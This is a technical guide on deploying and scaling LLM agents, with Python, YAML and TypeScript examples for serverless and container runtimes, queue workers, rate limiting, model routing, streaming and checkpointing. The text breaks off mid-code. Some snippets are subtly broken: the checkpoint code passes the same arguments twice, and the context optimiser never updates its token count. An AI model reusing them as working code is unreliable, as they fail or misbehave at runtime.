# 10 - Agent Infrastructure and Deployment

## Table of Contents

- [Introduction](#introduction)
- [1. Agent Runtime Environments](#1-agent-runtime-environments)
- [2. Scaling Agents](#2-scaling-agents)
- [3. Cost Optimization](#3-cost-optimization)
- [4. Latency Optimization](#4-latency-optimization)
- [5. State Management at Scale](#5-state-management-at-scale)
- [6. API Gateway for Agents](#6-api-gateway-for-agents)
- [7. Execution Sandboxes](#7-execution-sandboxes)
- [8. Message Queues and Event Systems](#8-message-queues-and-event-systems)
- [9. Caching Strategies](#9-caching-strategies)
- [10. Deployment Patterns](#10-deployment-patterns)
- [11. Infrastructure as Code](#11-infrastructure-as-code)
- [12. Common Interview Questions](#12-common-interview-questions)
- [13. Quick Reference](#13-quick-reference)

---

## Introduction

Agent infrastructure is where the rubber meets the road. You can design the most elegant ReAct loop, build perfect tool schemas, and tune your prompts to perfection -- but if your agent cannot handle 10,000 concurrent users, costs $50 per conversation, or takes 30 seconds to respond, none of that matters.

This guide covers the systems engineering behind production agent deployments. The mental model is straightforward: agents are long-running, stateful, unpredictable workloads that make external API calls. This makes them fundamentally different from traditional web services and requires infrastructure patterns adapted to their unique characteristics.

```
TRADITIONAL WEB SERVICE vs AGENT WORKLOAD

Web Service:                    Agent Workload:
+---------+                     +---------+
| Request |---> Process ---->   | Request |---> Loop ------+
| (50ms)  |     Response        | (5-60s) |     |          |
+---------+                     +---------+     v          |
                                            LLM Call       |
  - Stateless                               (1-10s)        |
  - Predictable latency                        |           |
  - CPU/memory bound                           v           |
  - Short-lived                             Tool Call      |
                                            (0.1-30s)      |
                                               |           |
                                               v           |
                                            Evaluate       |
                                               |           |
                                               +----back---+
                                               |
                                               v
                                            Response
                                            (5-60s total)

                                  - Stateful across steps
                                  - Unpredictable latency
                                  - I/O bound (API calls)
                                  - Long-lived (minutes)
```

Key differences that drive infrastructure decisions:

| Property          | Web Service                | Agent Workload                     |
| ----------------- | -------------------------- | ---------------------------------- |
| Duration          | 10-500ms                   | 5s to 10+ minutes                  |
| State             | Stateless or session-based | Stateful across multiple LLM calls |
| Resource pattern  | CPU/memory burst           | Long I/O waits with bursts         |
| Predictability    | Highly predictable         | Variable steps, variable cost      |
| Failure modes     | Simple timeout/error       | Partial completion, stuck loops    |
| Cost driver       | Compute                    | LLM API tokens                     |
| Concurrency model | Thread/process per request | Async I/O with queued API calls    |

---

## 1. Agent Runtime Environments

### The Spectrum of Runtime Options

```
SHORT-LIVED                                              LONG-LIVED
    |                                                        |
    v                                                        v
+----------+    +-----------+    +----------+    +----------+
| Serverless|    | Container |    | Long-    |    | Dedicated|
| Functions |    | Tasks     |    | Running  |    | VMs /    |
| (Lambda)  |    | (ECS/     |    | Services |    | Bare     |
|           |    |  Cloud Run)|    | (K8s)   |    | Metal    |
+-----------+    +-----------+    +----------+    +----------+

Best for:        Best for:        Best for:        Best for:
- Simple agents  - Batch agents   - Streaming      - GPU inference
- Low traffic    - Variable load  - WebSocket      - Custom models
- <15min tasks   - Isolation      - High traffic   - Full control

Cold start:      Startup:         Always warm:     Always warm:
1-10s            5-30s            0ms              0ms

Cost model:      Cost model:      Cost model:      Cost model:
Per invocation   Per second       Per hour         Per month
```

### Serverless Agents (AWS Lambda, Vercel Functions, Cloudflare Workers)

**When it works:** Simple agents with few tool calls, low-to-moderate traffic, request-response pattern.

**When it breaks:** Long-running agents (Lambda: 15min max), streaming responses, agents needing persistent connections.

```python
# AWS Lambda agent handler
import json
import boto3
from anthropic import Anthropic

client = Anthropic()

def lambda_handler(event, context):
    """Serverless agent -- works for simple, short-lived tasks."""
    body = json.loads(event["body"])
    user_message = body["message"]
    conversation_id = body.get("conversation_id")

    # Load state from DynamoDB (stateless function needs external state)
    messages = load_conversation(conversation_id) if conversation_id else []
    messages.append({"role": "user", "content": user_message})

    tools = [
        {
            "name": "search_docs",
            "description": "Search documentation",
            "input_schema": {
                "type": "object",
                "properties": {
                    "query": {"type": "string"}
                },
                "required": ["query"]
            }
        }
    ]

    # Agent loop -- must complete within Lambda timeout
    max_iterations = 5
    for _ in range(max_iterations):
        response = client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=4096,
            tools=tools,
            messages=messages
        )

        messages.append({"role": "assistant", "content": response.content})

        if response.stop_reason == "end_turn":
            break

        if response.stop_reason == "tool_use":
            tool_results = execute_tools(response.content)
            messages.append({"role": "user", "content": tool_results})

    # Persist state back to DynamoDB
    save_conversation(conversation_id, messages)

    return {
        "statusCode": 200,
        "body": json.dumps({
            "response": extract_text(response.content),
            "conversation_id": conversation_id
        })
    }
```

**Serverless limitations and workarounds:**

| Limitation                 | Workaround                                                        |
| -------------------------- | ----------------------------------------------------------------- |
| 15-minute timeout (Lambda) | Break into step functions, use SQS for continuation               |
| No WebSocket/streaming     | Use API Gateway WebSocket API or return presigned URL for polling |
| Cold starts (1-10s)        | Provisioned concurrency, keep-warm pings                          |
| No persistent connections  | External state store (DynamoDB, Redis)                            |
| Memory limits (10GB max)   | Offload to S3, use EFS mount                                      |

### Container-Based Agents (ECS, Cloud Run, Fly.io)

**The sweet spot for most production agents.** Containers give you isolation, reproducibility, and enough flexibility for long-running tasks without the operational burden of managing servers.

```yaml
# docker-compose.yml for agent service
version: '3.8'

services:
  agent-service:
    build:
      context: .
      dockerfile: Dockerfile
    environment:
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - REDIS_URL=redis://redis:6379
      - DATABASE_URL=postgresql://db:5432/agents
    ports:
      - '8080:8080'
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: '1.0'
      replicas: 3
    healthcheck:
      test: ['CMD', 'curl', '-f', 'http://localhost:8080/health']
      interval: 30s
      timeout: 10s
      retries: 3

  redis:
    image: redis:7-alpine
    volumes:
      - redis-data:/data

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: agents
      POSTGRES_PASSWORD: ${DB_PASSWORD}
    volumes:
      - pg-data:/var/lib/postgresql/data

volumes:
  redis-data:
  pg-data:
```

```dockerfile
# Dockerfile for agent service
FROM python:3.12-slim AS base

WORKDIR /app

# Install dependencies in a separate layer for caching
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY src/ ./src/

# Non-root user for security
RUN useradd --create-home appuser
USER appuser

EXPOSE 8080

CMD ["uvicorn", "src.main:app", "--host", "0.0.0.0", "--port", "8080"]
```

**Google Cloud Run configuration:**

```yaml
# cloud-run-service.yaml
apiVersion: serving.knative.dev/v1
kind: Service
metadata:
  name: agent-service
spec:
  template:
    metadata:
      annotations:
        autoscaling.knative.dev/minScale: '1' # Avoid cold starts
        autoscaling.knative.dev/maxScale: '100'
        run.googleapis.com/cpu-throttling: 'false' # Full CPU always
        run.googleapis.com/execution-environment: gen2
    spec:
      containerConcurrency: 10 # Agents are I/O bound, can share CPU
      timeoutSeconds: 900 # 15-minute timeout for long agents
      containers:
        - image: gcr.io/my-project/agent-service:latest
          resources:
            limits:
              memory: '2Gi'
              cpu: '2'
          ports:
            - containerPort: 8080
          env:
            - name: ANTHROPIC_API_KEY
              valueFrom:
                secretKeyRef:
                  name: anthropic-key
                  key: latest
```

### Edge Deployment

Edge deployment places agents closer to users geographically. Useful for latency-sensitive applications, but limited by edge runtime constraints.

```
USER (Tokyo)                    USER (NYC)
     |                               |
     v                               v
+----------+                    +----------+
| Edge PoP |                    | Edge PoP |
| Tokyo    |                    | NYC      |
| - Router |                    | - Router |
| - Cache  |                    | - Cache  |
| - Simple |                    | - Simple |
|   agent  |                    |   agent  |
+----+-----+                    +----+-----+
     |                               |
     +----------- Origin ------------+
               (us-east-1)
          +------------------+
          | Full Agent       |
          | - Complex logic  |
          | - Tool execution |
          | - State store    |
          +------------------+
```

**Hybrid edge pattern:** Route simple queries at the edge, complex ones to origin.

```typescript
// Cloudflare Worker -- edge router for agents
export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const body = (await request.json()) as AgentRequest;

    // Classify request complexity at the edge
    const complexity = classifyComplexity(body.message);

    if (complexity === 'simple') {
      // Handle at edge with smaller model and no tools
      return handleAtEdge(body, env);
    }

    // Forward complex requests to origin agent service
    return fetch(env.ORIGIN_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Request-ID': crypto.randomUUID(),
      },
      body: JSON.stringify(body),
    });
  },
};

function classifyComplexity(message: string): 'simple' | 'complex' {
  const simplePatterns = [
    /^(hi|hello|hey|thanks|thank you)/i,
    /what is your name/i,
    /help me understand/i,
  ];

  const needsTools = [
    /search|find|look up|calculate|run|execute|create|delete/i,
  ];

  if (needsTools.some((p) => p.test(message))) return 'complex';
  if (simplePatterns.some((p) => p.test(message))) return 'simple';
  return 'complex'; // Default to origin for safety
}
```

### Runtime Selection Decision Tree

```
START
  |
  v
Does agent need >15 min execution?
  |                    |
  YES                  NO
  |                    |
  v                    v
Container/VM      Does agent need streaming/WebSocket?
                       |                    |
                       YES                  NO
                       |                    |
                       v                    v
                  Long-running         Is traffic bursty with long idle periods?
                  service (K8s,            |                    |
                  ECS)                     YES                  NO
                                           |                    |
                                           v                    v
                                      Serverless           Container service
                                      (Lambda +             (Cloud Run,
                                       Step Functions)      ECS Fargate)
```

---

## 2. Scaling Agents

### Why Agent Scaling Is Different

Traditional web services are CPU-bound: you scale by adding more compute. Agents are I/O-bound: they spend most of their time waiting for LLM API responses. This means a single server can handle many concurrent agents, but you must manage API rate limits, connection pools, and state carefully.

```
TRADITIONAL WEB SERVICE SCALING:

Request --> [CPU Work 50ms] --> Response
Bottleneck: CPU

AGENT SCALING:

Request --> [LLM Call 3s] --> [Tool 0.5s] --> [LLM Call 2s] --> Response
               |                                    |
            WAITING                              WAITING
            (95% of time)                        (95% of time)

Bottleneck: LLM API rate limits, connection count, state management
```

### Horizontal Scaling Architecture

```
                    +-------------------+
                    |   Load Balancer   |
                    | (sticky sessions  |
                    |  for WebSocket)   |
                    +--------+----------+
                             |
              +--------------+--------------+
              |              |              |
        +-----+----+  +-----+----+  +-----+----+
        | Agent    |  | Agent    |  | Agent    |
        | Worker 1 |  | Worker 2 |  | Worker 3 |
        |          |  |          |  |          |
        | 50 conc. |  | 50 conc. |  | 50 conc. |
        | agents   |  | agents   |  | agents   |
        +-----+----+  +-----+----+  +-----+----+
              |              |              |
              +--------------+--------------+
                             |
              +--------------+--------------+
              |              |              |
        +-----+----+  +-----+----+  +-----+----+
        |  Redis   |  | Postgres |  |  S3/GCS  |
        |  (state, |  | (history,|  | (artifacts|
        |   locks) |  |  users)  |  |   logs)  |
        +----------+  +----------+  +----------+
```

### Queue-Based Processing

For agents that do not need real-time responses (batch processing, background tasks, email agents), a queue-based architecture decouples request ingestion from processing.

```
                                        +------------------+
  API Request                           |  Agent Worker 1  |
      |                                 |  (polling queue)  |
      v                                 +--------+---------+
+------------+     +---------------+             |
| API Server |---->| Message Queue |<---+--------+
| (fast,     |     | (SQS/Redis/  |    |
|  stateless)|     |  RabbitMQ)   |<---+--------+
+------------+     +------+-------+             |
      |                   |            +--------+---------+
      v                   |            |  Agent Worker 2  |
+------------+            |            |  (polling queue)  |
| Status DB  |<-----------+            +--------+---------+
| (poll for  |            |                      |
|  results)  |            +------------>---------+
+------------+                         |
                               +-------+----------+
                               |  Agent Worker N   |
                               |  (polling queue)   |
                               +------------------+
```

```python
# Queue-based agent worker
import asyncio
import json
from dataclasses import dataclass
from enum import Enum

import aio_pika
import redis.asyncio as redis


class JobStatus(str, Enum):
    QUEUED = "queued"
    PROCESSING = "processing"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass(frozen=True)
class AgentJob:
    job_id: str
    user_id: str
    message: str
    conversation_id: str
    priority: int = 0


class AgentWorker:
    def __init__(self, redis_url: str, rabbitmq_url: str):
        self.redis_client = redis.from_url(redis_url)
        self.rabbitmq_url = rabbitmq_url
        self.semaphore = asyncio.Semaphore(20)  # Max concurrent agents

    async def start(self):
        connection = await aio_pika.connect_robust(self.rabbitmq_url)
        channel = await connection.channel()
        await channel.set_qos(prefetch_count=20)

        queue = await channel.declare_queue(
            "agent_jobs",
            durable=True,
            arguments={"x-max-priority": 10}
        )

        async with queue.iterator() as queue_iter:
            async for message in queue_iter:
                async with message.process():
                    job = AgentJob(**json.loads(message.body))
                    await self.semaphore.acquire()
                    asyncio.create_task(self._process_with_release(job))

    async def _process_with_release(self, job: AgentJob):
        try:
            await self.process_job(job)
        finally:
            self.semaphore.release()

    async def process_job(self, job: AgentJob):
        await self._update_status(job.job_id, JobStatus.PROCESSING)

        try:
            result = await run_agent(job)
            await self._update_status(
                job.job_id,
                JobStatus.COMPLETED,
                result=result
            )
        except Exception as e:
            await self._update_status(
                job.job_id,
                JobStatus.FAILED,
                error=str(e)
            )

    async def _update_status(
        self,
        job_id: str,
        status: JobStatus,
        result: str | None = None,
        error: str | None = None,
    ):
        data = {"status": status.value}
        if result is not None:
            data["result"] = result
        if error is not None:
            data["error"] = error

        await self.redis_client.hset(f"job:{job_id}", mapping=data)
        await self.redis_client.expire(f"job:{job_id}", 86400)  # 24h TTL
```

### Concurrency Patterns

```python
# Concurrent agent execution with resource management
import asyncio
from contextlib import asynccontextmanager


class AgentPool:
    """Manages a pool of concurrent agent executions with resource limits."""

    def __init__(
        self,
        max_concurrent: int = 50,
        max_llm_calls_per_second: int = 100,
    ):
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.rate_limiter = TokenBucketRateLimiter(
            rate=max_llm_calls_per_second,
            capacity=max_llm_calls_per_second
        )
        self.active_agents: dict[str, AgentExecution] = {}

    @asynccontextmanager
    async def acquire(self, agent_id: str):
        await self.semaphore.acquire()
        execution = AgentExecution(agent_id, self.rate_limiter)
        self.active_agents[agent_id] = execution
        try:
            yield execution
        finally:
            del self.active_agents[agent_id]
            self.semaphore.release()

    async def run_agent(self, agent_id: str, request: AgentRequest):
        async with self.acquire(agent_id) as execution:
            return await execution.run(request)

    def get_stats(self) -> dict:
        return {
            "active_agents": len(self.active_agents),
            "available_slots": self.semaphore._value,
            "rate_limiter_tokens": self.rate_limiter.available_tokens,
        }


class TokenBucketRateLimiter:
    """Rate limiter for LLM API calls across all agents."""

    def __init__(self, rate: float, capacity: float):
        self.rate = rate
        self.capacity = capacity
        self.tokens = capacity
        self.last_refill = asyncio.get_event_loop().time()
        self.lock = asyncio.Lock()

    async def acquire(self):
        while True:
            async with self.lock:
                now = asyncio.get_event_loop().time()
                elapsed = now - self.last_refill
                self.tokens = min(
                    self.capacity,
                    self.tokens + elapsed * self.rate
                )
                self.last_refill = now

                if self.tokens >= 1:
                    self.tokens -= 1
                    return

            await asyncio.sleep(0.01)

    @property
    def available_tokens(self) -> float:
        return self.tokens
```

### Auto-Scaling Configuration

```yaml
# Kubernetes HPA for agent workers
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: agent-worker-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: agent-worker
  minReplicas: 2
  maxReplicas: 50
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 60
      policies:
        - type: Pods
          value: 5
          periodSeconds: 60
    scaleDown:
      stabilizationWindowSeconds: 300 # Slow scale-down (agents are long-lived)
      policies:
        - type: Pods
          value: 2
          periodSeconds: 120
  metrics:
    # Scale on queue depth
    - type: External
      external:
        metric:
          name: rabbitmq_queue_messages
          selector:
            matchLabels:
              queue: agent_jobs
        target:
          type: AverageValue
          averageValue: '5' # 5 messages per pod
    # Also scale on active agent count
    - type: Pods
      pods:
        metric:
          name: active_agents
        target:
          type: AverageValue
          averageValue: '30' # Target 30 agents per pod
```

---

## 3. Cost Optimization

### The Agent Cost Equation

```
Total Cost = SUM over all requests of:
  (Input Tokens x Input Price) +
  (Output Tokens x Output Price) +
  (Tool Execution Cost) +
  (Infrastructure Cost)

For a typical agent conversation:
  Input:  ~5,000 tokens x $3/M   = $0.015
  Output: ~2,000 tokens x $15/M  = $0.030
  Tools:  3 calls x ~$0.001      = $0.003
  Infra:  ~5s compute             = $0.0001
                                  ---------
  Total per conversation:          ~$0.05

  At 100K conversations/day:       $5,000/day = $150K/month
```

### Model Routing (Tiered Intelligence)

The single most impactful cost optimization: use the right model for the right task.

```
USER REQUEST
     |
     v
+----+--------+
| Request     |
| Classifier  |  <-- Small model or heuristic
+----+--------+
     |
     +----------+----------+
     |          |          |
     v          v          v
  SIMPLE     MEDIUM     COMPLEX
     |          |          |
     v          v          v
  Haiku     Sonnet      Opus
  $0.25/M   $3/M        $15/M
  input     input       input

  ~60%       ~30%        ~10%
  of         of          of
  requests   requests    requests

  BLENDED COST: ~60% cheaper than using Opus for everything
```

```python
from dataclasses import dataclass
from enum import Enum


class ModelTier(str, Enum):
    FAST = "fast"       # Haiku -- cheap, fast
    BALANCED = "balanced"  # Sonnet -- good balance
    POWERFUL = "powerful"  # Opus -- maximum capability


@dataclass(frozen=True)
class ModelConfig:
    model_id: str
    input_cost_per_million: float
    output_cost_per_million: float
    max_tokens: int
    tier: ModelTier


MODEL_CONFIGS = {
    ModelTier.FAST: ModelConfig(
        model_id="claude-haiku-4-20250414",
        input_cost_per_million=0.25,
        output_cost_per_million=1.25,
        max_tokens=8192,
        tier=ModelTier.FAST,
    ),
    ModelTier.BALANCED: ModelConfig(
        model_id="claude-sonnet-4-20250514",
        input_cost_per_million=3.0,
        output_cost_per_million=15.0,
        max_tokens=16384,
        tier=ModelTier.BALANCED,
    ),
    ModelTier.POWERFUL: ModelConfig(
        model_id="claude-opus-4-20250514",
        input_cost_per_million=15.0,
        output_cost_per_million=75.0,
        max_tokens=32768,
        tier=ModelTier.POWERFUL,
    ),
}


class ModelRouter:
    """Routes requests to the appropriate model tier based on complexity."""

    def __init__(self):
        self.classifier = self._build_classifier()

    def select_model(self, request: str, context: dict) -> ModelConfig:
        complexity = self._assess_complexity(request, context)
        return MODEL_CONFIGS[complexity]

    def _assess_complexity(self, request: str, context: dict) -> ModelTier:
        signals = {
            "token_count": len(request.split()),
            "has_code": any(
                kw in request.lower()
                for kw in ["code", "implement", "debug", "refactor"]
            ),
            "needs_reasoning": any(
                kw in request.lower()
                for kw in ["analyze", "compare", "design", "architect", "why"]
            ),
            "is_simple": any(
                kw in request.lower()
                for kw in ["summarize", "translate", "format", "list"]
            ),
            "tool_count": context.get("available_tools", 0),
            "conversation_length": context.get("message_count", 0),
        }

        # Simple heuristic routing -- production systems use a trained classifier
        if signals["is_simple"] and not signals["needs_reasoning"]:
            return ModelTier.FAST

        if signals["needs_reasoning"] and signals["tool_count"] > 5:
            return ModelTier.POWERFUL

        return ModelTier.BALANCED

    def _build_classifier(self):
        """
        Production systems train a small classifier on labeled data:
        (request_features) -> model_tier

        Training data comes from:
        1. A/B tests comparing model performance per tier
        2. Human quality ratings
        3. Task success/failure rates by model
        """
        pass


class CostTracker:
    """Tracks and reports agent costs in real time."""

    def __init__(self, budget_limit_usd: float = 100.0):
        self.budget_limit = budget_limit_usd
        self.total_cost = 0.0
        self.costs_by_model: dict[str, float] = {}
        self.costs_by_user: dict[str, float] = {}

    def record_usage(
        self,
        model: ModelConfig,
        input_tokens: int,
        output_tokens: int,
        user_id: str,
    ) -> dict:
        cost = (
            (input_tokens * model.input_cost_per_million / 1_000_000) +
            (output_tokens * model.output_cost_per_million / 1_000_000)
        )

        self.total_cost += cost
        self.costs_by_model[model.model_id] = (
            self.costs_by_model.get(model.model_id, 0) + cost
        )
        self.costs_by_user[user_id] = (
            self.costs_by_user.get(user_id, 0) + cost
        )

        if self.total_cost > self.budget_limit:
            raise BudgetExceededError(
                f"Budget limit ${self.budget_limit} exceeded. "
                f"Total cost: ${self.total_cost:.2f}"
            )

        return {
            "cost_usd": cost,
            "total_cost_usd": self.total_cost,
            "budget_remaining_usd": self.budget_limit - self.total_cost,
        }
```

### Prompt Optimization for Cost

```python
# Context window management to reduce token costs

class ContextOptimizer:
    """Reduces token usage by managing what goes into the context window."""

    def __init__(self, max_context_tokens: int = 100_000):
        self.max_tokens = max_context_tokens

    def optimize_messages(
        self, messages: list[dict], system_prompt: str
    ) -> list[dict]:
        """
        Strategies applied in order:
        1. Summarize old messages
        2. Remove redundant tool results
        3. Truncate large tool outputs
        4. Drop system prompt examples if context is tight
        """
        optimized = list(messages)  # Don't mutate original

        total_tokens = self._estimate_tokens(optimized) + len(system_prompt) // 4

        if total_tokens > self.max_tokens * 0.8:
            optimized = self._summarize_old_messages(optimized)

        if total_tokens > self.max_tokens * 0.8:
            optimized = self._truncate_tool_results(optimized)

        return optimized

    def _summarize_old_messages(
        self, messages: list[dict]
    ) -> list[dict]:
        """Keep last N messages verbatim, summarize earlier ones."""
        if len(messages) <= 6:
            return messages

        keep_recent = 6
        old_messages = messages[:-keep_recent]
        recent_messages = messages[-keep_recent:]

        summary = self._generate_summary(old_messages)

        return [
            {
                "role": "user",
                "content": f"[Previous conversation summary: {summary}]"
            },
            *recent_messages,
        ]

    def _truncate_tool_results(
        self, messages: list[dict], max_result_tokens: int = 2000
    ) -> list[dict]:
        """Truncate large tool results to save tokens."""
        result = []
        for msg in messages:
            if isinstance(msg.get("content"), list):
                new_content = []
                for block in msg["content"]:
                    if (
                        block.get("type") == "tool_result"
                        and len(str(block.get("content", ""))) > max_result_tokens * 4
                    ):
                        truncated_block = {
                            **block,
                            "content": str(block["content"])[:max_result_tokens * 4]
                            + "\n... [truncated]",
                        }
                        new_content.append(truncated_block)
                    else:
                        new_content.append(block)
                result.append({**msg, "content": new_content})
            else:
                result.append(msg)
        return result

    def _estimate_tokens(self, messages: list[dict]) -> int:
        return sum(len(str(m)) for m in messages) // 4

    def _generate_summary(self, messages: list[dict]) -> str:
        # In production, use a fast model to generate this summary
        return "Previous messages summarized for context efficiency."
```

### Cost Optimization Checklist

```
+---------------------------------------------------+--------+
| Technique                                         | Saving |
+---------------------------------------------------+--------+
| Model routing (use Haiku for 60% of requests)     | 40-60% |
| Semantic caching of repeated queries              | 20-40% |
| Context window summarization                      | 10-30% |
| Prompt optimization (shorter system prompts)      | 5-15%  |
| Tool result truncation                            | 5-10%  |
| Batching multiple user messages                   | 5-10%  |
| Early termination (stop unnecessary loops)        | 10-20% |
| Max iteration limits on agent loops               | 5-15%  |
+---------------------------------------------------+--------+
```

---

## 4. Latency Optimization

### Where Time Goes in an Agent Request

```
TOTAL LATENCY: 5-30 seconds typical

+--------+  +--------+  +--------+  +--------+  +--------+
|  TTFB  |  | LLM #1 |  | Tool   |  | LLM #2 |  | Post   |
| 50ms   |  | 1-5s   |  | 0.1-5s |  | 1-5s   |  | 50ms   |
+--------+  +--------+  +--------+  +--------+  +--------+

TTFB: Time to first byte (network, auth, routing)
LLM:  Model inference (dominated by output token generation)
Tool: External API calls, database queries, code execution
Post: Response formatting, logging, cleanup

OPTIMIZATION LEVERAGE:
  LLM calls: HIGH    (streaming, model selection, prompt length)
  Tool calls: MEDIUM (parallel execution, caching, timeouts)
  Network:    LOW    (CDN, edge routing, connection pooling)
```

### Streaming

Streaming is the most impactful latency optimization for user-facing agents. Instead of waiting 5-10 seconds for a complete response, users see tokens appear within 200ms.

```python
# Server-Sent Events (SSE) streaming for agent responses
from fastapi import FastAPI, Request
from fastapi.responses import StreamingResponse
from anthropic import Anthropic
import json

app = FastAPI()
client = Anthropic()


@app.post("/agent/stream")
async def stream_agent(request: Request):
    body = await request.json()

    async def event_generator():
        messages = [{"role": "user", "content": body["message"]}]
        tools = load_tools()

        while True:
            # Stream the LLM response token by token
            with client.messages.stream(
                model="claude-sonnet-4-20250514",
                max_tokens=4096,
                tools=tools,
                messages=messages,
            ) as stream:
                collected_content = []

                for event in stream:
                    if event.type == "content_block_delta":
                        if hasattr(event.delta, "text"):
                            yield f"data: {json.dumps({'type': 'text', 'content': event.delta.text})}\n\n"

                    elif event.type == "content_block_start":
                        if event.content_block.type == "tool_use":
                            yield f"data: {json.dumps({'type': 'tool_start', 'tool': event.content_block.name})}\n\n"

                response = stream.get_final_message()
                collected_content = response.content

            messages.append({"role": "assistant", "content": collected_content})

            if response.stop_reason == "end_turn":
                yield f"data: {json.dumps({'type': 'done'})}\n\n"
                break

            if response.stop_reason == "tool_use":
                tool_results = await execute_tools_parallel(collected_content)
                messages.append({"role": "user", "content": tool_results})

                yield f"data: {json.dumps({'type': 'tool_complete'})}\n\n"

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
        },
    )
```

### Parallel Tool Execution

When the LLM requests multiple tool calls in a single turn, execute them in parallel rather than sequentially.

```python
import asyncio
from typing import Any


async def execute_tools_parallel(
    content_blocks: list[dict],
) -> list[dict]:
    """Execute all tool calls from a single LLM turn in parallel."""
    tool_use_blocks = [
        block for block in content_blocks
        if block.get("type") == "tool_use" or getattr(block, "type", None) == "tool_use"
    ]

    if not tool_use_blocks:
        return []

    # Execute all tool calls concurrently
    tasks = [
        execute_single_tool(block)
        for block in tool_use_blocks
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    tool_results = []
    for block, result in zip(tool_use_blocks, results):
        tool_id = block.get("id", getattr(block, "id", ""))
        if isinstance(result, Exception):
            tool_results.append({
                "type": "tool_result",
                "tool_use_id": tool_id,
                "content": f"Error: {result}",
                "is_error": True,
            })
        else:
            tool_results.append({
                "type": "tool_result",
                "tool_use_id": tool_id,
                "content": str(result),
            })

    return tool_results


async def execute_single_tool(block: Any) -> str:
    """Execute a single tool call with timeout."""
    name = block.get("name", getattr(block, "name", ""))
    input_data = block.get("input", getattr(block, "input", {}))

    tool_fn = TOOL_REGISTRY.get(name)
    if tool_fn is None:
        raise ValueError(f"Unknown tool: {name}")

    # Enforce per-tool timeout
    timeout = TOOL_TIMEOUTS.get(name, 30)
    return await asyncio.wait_for(tool_fn(input_data), timeout=timeout)


TOOL_TIMEOUTS = {
    "search": 10,
    "read_file": 5,
    "run_code": 30,
    "web_fetch": 15,
}
```

### Speculative Execution

Start likely next steps before the current step completes. This is a latency optimization borrowed from CPU architecture.

```python
class SpeculativeAgent:
    """
    Speculatively pre-fetches likely tool results while the LLM is still
    generating, reducing wait time for common patterns.
    """

    def __init__(self):
        self.prediction_cache: dict[str, Any] = {}

    async def run_with_speculation(self, messages: list[dict]) -> str:
        # Start LLM call
        llm_task = asyncio.create_task(self._call_llm(messages))

        # While LLM is thinking, predict likely tool calls and pre-fetch
        predictions = self._predict_tool_calls(messages)
        prefetch_tasks = {
            key: asyncio.create_task(self._prefetch(prediction))
            for key, prediction in predictions.items()
        }

        response = await llm_task

        # Check if any predictions match actual tool calls
        for tool_block in self._extract_tool_calls(response):
            cache_key = self._make_cache_key(tool_block)
            if cache_key in prefetch_tasks:
                # Cache hit -- use pre-fetched result
                result = await prefetch_tasks[cache_key]
                self.prediction_cache[cache_key] = result

        # Cancel unused prefetches
        for key, task in prefetch_tasks.items():
            if key not in self.prediction_cache:
                task.cancel()

        return response

    def _predict_tool_calls(
        self, messages: list[dict]
    ) -> dict[str, dict]:
        """
        Predict likely tool calls based on conversation patterns.

        Examples:
        - "What's in file X?" --> predict read_file(X)
        - "Search for Y" --> predict search(Y)
        - After reading a file, predict reading related files
        """
        predictions = {}
        last_message = messages[-1].get("content", "")

        # Pattern: file reference --> likely read_file
        file_patterns = self._extract_file_paths(last_message)
        for path in file_patterns:
            key = f"read_file:{path}"
            predictions[key] = {"tool": "read_file", "input": {"path": path}}

        return predictions
```

### Model Selection for Latency

```
MODEL LATENCY COMPARISON (approximate):

Model          TTFT*    Tokens/sec   Typical Response
------         -----    ----------   ----------------
Haiku          200ms    150 tok/s    0.5-1s
Sonnet         300ms    80 tok/s     1-3s
Opus           800ms    40 tok/s     3-10s

*TTFT = Time to First Token

STRATEGY:
  - Use Haiku for routing/classification (200ms overhead)
  - Use Sonnet for main agent loop (best speed/quality)
  - Use Opus only when quality demands it
  - Stream always to reduce perceived latency
```

---

## 5. State Management at Scale

### State Categories in Agent Systems

```
STATE TYPE          LIFETIME        STORAGE         EXAMPLE
----------          --------        -------         -------
Conversation        Minutes-Hours   Redis/Memory    Chat messages, tool results
Session             Hours-Days      Redis + DB      User preferences, auth
Agent Execution     Seconds-Mins    Memory/Redis    Current step, loop counter
Checkpoint          Days-Weeks      Database/S3     Resumable agent state
Long-term Memory    Months-Years    Vector DB + DB  User facts, preferences
Artifacts           Permanent       S3/GCS          Generated files, code
```

### Distributed Checkpointing

Checkpointing allows agents to resume after failures, scale across machines, and support long-running workflows.

```python
import json
import hashlib
from dataclasses import dataclass, asdict
from datetime import datetime, timezone


@dataclass(frozen=True)
class AgentCheckpoint:
    agent_id: str
    conversation_id: str
    step_number: int
    messages: tuple  # Immutable tuple instead of list
    pending_tool_calls: tuple
    metadata: dict
    timestamp: str
    checksum: str


class CheckpointStore:
    """Distributed checkpoint storage for agent state."""

    def __init__(self, redis_client, s3_client, bucket: str):
        self.redis = redis_client
        self.s3 = s3_client
        self.bucket = bucket

    async def save(
        self,
        agent_id: str,
        conversation_id: str,
        step: int,
        messages: list,
        pending_tools: list,
        metadata: dict,
    ) -> AgentCheckpoint:
        """Save agent state as a checkpoint."""
        # Create immutable checkpoint
        data = {
            "agent_id": agent_id,
            "conversation_id": conversation_id,
            "step_number": step,
            "messages": messages,
            "pending_tool_calls": pending_tools,
            "metadata": metadata,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

        checksum = hashlib.sha256(
            json.dumps(data, sort_keys=True).encode()
        ).hexdigest()[:16]

        checkpoint = AgentCheckpoint(
            **data,
            messages=tuple(messages),
            pending_tool_calls=tuple(pending_tools),
            checksum=checksum,
        )

        key = f"checkpoint:{agent_id}:{conversation_id}:{step}"

        # Hot storage in Redis (fast access, 24h TTL)
        await self.redis.setex(
            key,
            86400,
